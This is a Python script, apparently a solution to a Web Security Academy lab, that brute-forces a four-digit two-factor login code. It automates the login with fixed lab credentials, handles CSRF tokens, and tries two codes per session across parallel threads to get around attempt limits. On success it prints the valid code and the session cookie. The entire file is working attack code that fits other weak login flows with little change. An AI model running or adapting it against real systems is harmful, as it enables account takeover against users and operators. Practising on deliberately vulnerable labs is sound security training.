#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED
import threading
import time

TARGET = "https://0a9d00a9047383b2805d26d900fa0043.web-security-academy.net"
USERNAME = "carlos"
PASSWORD = "montoya"
MAX_WORKERS = 15
TIMEOUT = 8

stop_flag = threading.Event()
success_result = {}
lock = threading.Lock()
tried_count = 0


def extract_csrf(html):
    soup = BeautifulSoup(html, "html.parser")
    el = soup.find("input", {"name": "csrf"})
    return el["value"] if el and el.has_attr("value") else None


def brute_session(code1, code2):
    global tried_count

    if stop_flag.is_set():
        return

    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0"})

    try:
        r = s.get(TARGET + "/login", timeout=TIMEOUT)
        csrf1 = extract_csrf(r.text)
        if not csrf1:
            return

        s.post(TARGET + "/login", data={
            "csrf": csrf1, "username": USERNAME, "password": PASSWORD
        }, timeout=TIMEOUT)

        r = s.get(TARGET + "/login2", timeout=TIMEOUT)
        csrf2 = extract_csrf(r.text)
        if not csrf2:
            return
        
        r = s.post(TARGET + "/login2", data={
            "csrf": csrf2, "mfa-code": f"{code1:04d}"
        }, timeout=TIMEOUT, allow_redirects=False)

        if r.status_code == 302:
            with lock:
                if not stop_flag.is_set():
                    stop_flag.set()
                    success_result["code"] = f"{code1:04d}"
                    success_result["cookie"] = r.headers.get("Set-Cookie", "")
            return

        if not stop_flag.is_set():
            r2 = s.get(TARGET + "/login2", timeout=TIMEOUT)
            csrf2b = extract_csrf(r2.text) or csrf2

            r2 = s.post(TARGET + "/login2", data={
                "csrf": csrf2b, "mfa-code": f"{code2:04d}"
            }, timeout=TIMEOUT, allow_redirects=False)

            if r2.status_code == 302:
                with lock:
                    if not stop_flag.is_set():
                        stop_flag.set()
                        success_result["code"] = f"{code2:04d}"
                        success_result["cookie"] = r2.headers.get("Set-Cookie", "")

    except requests.RequestException:
        pass
    finally:
        with lock:
            tried_count += 2


def main():
    global tried_count
    print(f"[*] Target: {TARGET}")
    print(f"[*] Workers: {MAX_WORKERS}")
    print(f"[*] Starting...\n")

    start = time.time()
    pairs = [(i, i + 1) for i in range(0, 10000, 2)]

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futures = {}

        for pair in pairs:
            if stop_flag.is_set():
                break

            futures[ex.submit(brute_session, pair[0], pair[1])] = pair

            if len(futures) >= MAX_WORKERS * 3:
                done, _ = wait(futures, return_when=FIRST_COMPLETED)
                for fut in done:
                    futures.pop(fut, None)

                if tried_count % 200 < 2:
                    elapsed = time.time() - start
                    rate = tried_count / elapsed if elapsed > 0 else 0
                    print(f"[{tried_count:05d}/10000] | {rate:.1f} codes/s | {elapsed:.0f}s")

        for fut in futures:
            fut.cancel()

    elapsed = time.time() - start

    if "code" in success_result:
        print(f"\n{'='*50}")
        print(f"[+] SUCCESS! Code = {success_result['code']}")
        print(f"[+] Cookie: {success_result.get('cookie', '')}")
        print(f"[+] Time: {elapsed:.1f}s")
        print(f"{'='*50}")
    else:
        print(f"\n[-] Not found in {elapsed:.1f}s")


if __name__ == "__main__":
    main()